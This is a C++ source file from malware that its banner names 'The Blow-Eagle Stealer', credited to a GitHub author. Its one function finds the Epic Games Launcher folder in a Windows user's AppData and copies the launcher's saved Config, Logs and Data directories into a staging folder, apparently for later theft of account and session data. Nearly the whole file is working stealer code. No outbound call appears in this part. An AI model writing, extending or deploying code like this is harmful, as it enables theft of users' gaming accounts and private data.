/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

#include "../targets.h"
#include "../../config/config.c"
#include  "../../helper/helper.h"

void gaming::Epic()
{
	printf("Epic\n");
	std::string user = func::GetUser();

	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/EpicGamesLauncher")) 
	{
		std::string dirs[] = {
	"C:/Users/" + user + "/AppData/Local" + "/EpicGamesLauncher/Saved/Config",
	"C:/Users/" + user + "/AppData/Local" + "/EpicGamesLauncher/Saved/Logs",
	"C:/Users/" + user + "/AppData/Local" + "/EpicGamesLauncher/Saved/Data"
		};

		std::string defaultPaths[] = {

		"C:/Users/" + user + config::path + "/Games",
		"C:/Users/" + user + config::path + "/Games/EpicGames",
		"C:/Users/" + user + config::path + "/Games/EpicGames/Config",
		"C:/Users/" + user + config::path + "/Games/EpicGames/Logs",
		"C:/Users/" + user + config::path + "/Games/EpicGames/Data",

		};

		for (size_t i = 0; i < std::size(defaultPaths); i++)
		{
			int result = _mkdir(defaultPaths[i].c_str());
		}
		try
		{
			for (size_t i = 0; i < std::size(dirs); i++)
			{
				//copytree(user+ sep + path,rf'{pathtofile}\windll\Games\EpicGames\Config')

				func::copyDirectory(dirs[i], defaultPaths[i + 2]);
			}
		}
		catch (const char* error_message)
		{
			std::cout << error_message << std::endl;
		}


	}

	
}